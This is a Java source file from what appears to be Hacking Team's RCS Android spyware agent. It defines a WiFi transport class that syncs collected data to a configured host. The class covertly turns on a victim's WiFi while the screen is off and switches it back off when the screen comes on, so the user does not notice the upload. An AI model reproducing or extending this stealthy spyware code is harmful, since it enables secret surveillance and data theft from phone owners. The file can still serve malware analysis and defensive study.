/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : WifiTransport.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.action.sync;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;

import com.android.dvci.Device;
import com.android.dvci.Standby;
import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.interfaces.Observer;
import com.android.dvci.listener.ListenerStandby;
import com.android.dvci.module.ProcessObserver;
import com.android.dvci.module.StandByObserver;
import com.android.dvci.util.Check;
import com.android.dvci.util.Utils;

/**
 * The Class WifiTransport.
 */
public class WifiTransport extends HttpKeepAliveTransport implements Observer<Standby> {
	private static final String TAG = "WifiTransport"; //$NON-NLS-1$
	/** The forced. */
	private boolean forced;
	private boolean switchedOn;

	// final String service = Context.WIFI_SERVICE;
	final WifiManager wifi = (WifiManager) Status.getAppContext().getSystemService(Context.WIFI_SERVICE);
	private final ConnectivityManager connManager = (ConnectivityManager) Status.getAppContext().getSystemService(
			Context.CONNECTIVITY_SERVICE);
	private int ip;

	/**
	 * Instantiates a new wifi transport.
	 * 
	 * @param host
	 *            the host
	 */
	public WifiTransport(final String host) {
		super(host);
	}

	/**
	 * Instantiates a new wifi transport.
	 * 
	 * @param host
	 *            the host
	 * @param wifiForced
	 *            the wifi forced
	 */
	public WifiTransport(final String host, final boolean wifiForced) {
		super(host);
		// this.ip = lookupHost(host);
		this.forced = wifiForced;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.sync.Transport#isAvailable()
	 */
	@Override
	public boolean isAvailable() {
		if (Device.self().isSimulator()) {
			return true;
		}

		// NetworkInfo mWifi =
		// connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
		// boolean available = mWifi.isAvailable() && /*mWifi.isConnected()*/
		// mWifi.isConnectedOrConnecting();
		boolean available = Status.wifiConnected;

		if (available) {
			connManager.setNetworkPreference(ConnectivityManager.TYPE_WIFI);
		}

		return available;
	}

	@Override
	public void enable() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (enable): forced: " + forced + " wifiState: " + wifi.getWifiState()); //$NON-NLS-1$
		}

		if (forced == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (enable): wifi connectivity won't be forced, force flag is disabled"); //$NON-NLS-1$
			}

			return;
		}

		// wifi.reconnect();
		// wifi.reassociate();
		// ConnectivityManager.setNetworkPrefrence(ConnectivityManager.TYPE_WIFI)
		if (wifi.getWifiState() == WifiManager.WIFI_STATE_ENABLED
				|| wifi.getWifiState() == WifiManager.WIFI_STATE_ENABLING) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (enable): wifi already on, forcing not required"); //$NON-NLS-1$
			}

			return;
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (enable): trying to enable wifi");//$NON-NLS-1$
		}

		switchedOn = wifi.setWifiEnabled(true);

		if (switchedOn == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (enable): cannot enable WiFi interface"); //$NON-NLS-1$
			}
		} else {
			for (int i = 0; i < 30; i++) {
				if (isAvailable()) {
					break;
				}

				Utils.sleep(1000);
			}

			if (Cfg.ENABLE_WIFI_DISABLE) {
				if (switchedOn && !ListenerStandby.self().isScreenOn()) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (enable) ListenerStandby start");
					}
					ListenerStandby.self().attach(this);
				}
			}
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (enable) finished " + isAvailable());
		}
	}

	@Override
	public void close() {
		super.close();

		if (switchedOn) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (close) detach Standby");
			}
			if (Cfg.ENABLE_WIFI_DISABLE) {
				ListenerStandby.self().detach(this);
			}
			wifi.setWifiEnabled(false);
			switchedOn = false;
		}
	}

	@Override
	public int notification(Standby b) {
		if (Cfg.ENABLE_WIFI_DISABLE) {
			if (b.isScreenOn() && switchedOn) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (notification) Switching off because screen is on");
				}
				ListenerStandby.self().detach(this);
				wifi.setWifiEnabled(false);
				switchedOn = false;
			}
		}
		return 0;

	}
}
